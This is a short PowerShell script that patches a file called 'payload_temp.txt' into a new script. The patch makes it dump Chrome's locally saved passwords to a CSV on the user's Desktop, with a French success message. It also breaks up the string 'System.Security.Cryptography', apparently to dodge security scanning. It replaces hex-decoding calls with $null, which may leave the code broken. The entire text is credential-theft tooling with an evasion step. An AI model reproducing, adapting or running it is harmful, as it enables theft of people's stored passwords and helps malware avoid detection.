$c = Get-Content 'payload_temp.txt' -Raw
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace '#requires -version 7', ''

# Fixing the bug: Convert class fails on some PS5 instances so we just replace the call with $null (the argument part is also stripped via regex)
$c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'

$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Set-Content "test_run2.ps1" -Value $c
